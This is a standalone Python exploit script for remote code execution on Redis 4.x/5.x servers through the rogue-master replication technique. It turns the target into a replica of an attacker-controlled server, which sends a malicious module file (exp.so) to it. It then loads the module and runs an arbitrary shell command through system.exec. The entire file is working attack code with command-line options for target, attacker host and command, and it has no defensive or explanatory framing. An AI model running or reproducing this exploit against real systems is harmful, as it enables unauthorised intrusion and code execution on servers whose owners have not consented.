#!/usr/bin/env python3
import os
import sys
import argparse
import socketserver
import logging
import socket
import time

logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='>> %(message)s')
DELIMITER = b"\r\n"


class RoguoHandler(socketserver.BaseRequestHandler):
    def decode(self, data):
        if data.startswith(b'*'):
            return data.strip().split(DELIMITER)[2::2]
        if data.startswith(b'$'):
            return data.split(DELIMITER, 2)[1]

        return data.strip().split()

    def handle(self):
        while True:
            data = self.request.recv(1024)
            logging.info("receive data: %r", data)
            arr = self.decode(data)
            if arr[0].startswith(b'PING'):
                self.request.sendall(b'+PONG' + DELIMITER)
            elif arr[0].startswith(b'REPLCONF'):
                self.request.sendall(b'+OK' + DELIMITER)
            elif arr[0].startswith(b'PSYNC') or arr[0].startswith(b'SYNC'):
                self.request.sendall(b'+FULLRESYNC ' + b'Z' * 40 + b' 1' + DELIMITER)
                self.request.sendall(b'$' + str(len(self.server.payload)).encode() + DELIMITER)
                self.request.sendall(self.server.payload + DELIMITER)
                break

        self.finish()

    def finish(self):
        self.request.close()


class RoguoServer(socketserver.TCPServer):
    allow_reuse_address = True

    def __init__(self, server_address, payload):
        super(RoguoServer, self).__init__(server_address, RoguoHandler, True)
        self.payload = payload


class RedisClient(object):
    def __init__(self, rhost, rport):
        self.client = socket.create_connection((rhost, rport), timeout=10)

    def send(self, data):
        data = self.encode(data)
        self.client.send(data)
        logging.info("send data: %r", data)
        return self.recv()

    def recv(self, count=65535):
        data = self.client.recv(count)
        logging.info("receive data: %r", data)
        return data

    def encode(self, data):
        if isinstance(data, bytes):
            data = data.split()

        args = [b'*', str(len(data)).encode()]
        for arg in data:
            args.extend([DELIMITER, b'$', str(len(arg)).encode(), DELIMITER, arg])

        args.append(DELIMITER)
        return b''.join(args)


def decode_command_line(data):
    if not data.startswith(b'$'):
        return data.decode(errors='ignore')

    offset = data.find(DELIMITER)
    size = int(data[1:offset])
    offset += len(DELIMITER)
    data = data[offset:offset+size]
    return data.decode(errors='ignore')


def exploit(rhost, rport, lhost, lport, expfile, command, auth):
    with open(expfile, 'rb') as f:
        server = RoguoServer(('0.0.0.0', lport), f.read())

    client = RedisClient(rhost, rport)

    lhost = lhost.encode()
    lport = str(lport).encode()
    command = command.encode()

    if auth:
        client.send([b'AUTH', auth.encode()])

    client.send([b'SLAVEOF', lhost, lport])
    client.send([b'CONFIG', b'SET', b'dbfilename', b'exp.so'])
    time.sleep(2)

    server.handle_request()
    time.sleep(2)

    client.send([b'MODULE', b'LOAD', b'./exp.so'])
    client.send([b'SLAVEOF', b'NO', b'ONE'])
    client.send([b'CONFIG', b'SET', b'dbfilename', b'dump.rdb'])
    resp = client.send([b'system.exec', command])
    print(decode_command_line(resp))

    client.send([b'MODULE', b'UNLOAD', b'system'])


def main():
    parser = argparse.ArgumentParser(description='Redis 4.x/5.x RCE with RedisModules')
    parser.add_argument("-r", "--rhost", dest="rhost", type=str, help="target host", required=True)
    parser.add_argument("-p", "--rport", dest="rport", type=int,
                        help="target redis port, default 6379", default=6379)
    parser.add_argument("-L", "--lhost", dest="lhost", type=str,
                        help="rogue server ip", required=True)
    parser.add_argument("-P", "--lport", dest="lport", type=int,
                        help="rogue server listen port, default 21000", default=21000)
    parser.add_argument("-f", "--file", type=str, help="RedisModules to load, default exp.so", default='exp.so')
    parser.add_argument('-c', '--command', type=str, help='Command that you want to execute', default='id')

    parser.add_argument("-a", "--auth", dest="auth", type=str, help="redis password")
    options = parser.parse_args()

    filename = options.file
    if not os.path.exists(filename):
        logging.info("Where you module? ")
        sys.exit(1)

    exploit(options.rhost, options.rport, options.lhost, options.lport, filename, options.command, options.auth)


if __name__ == '__main__':
    main()
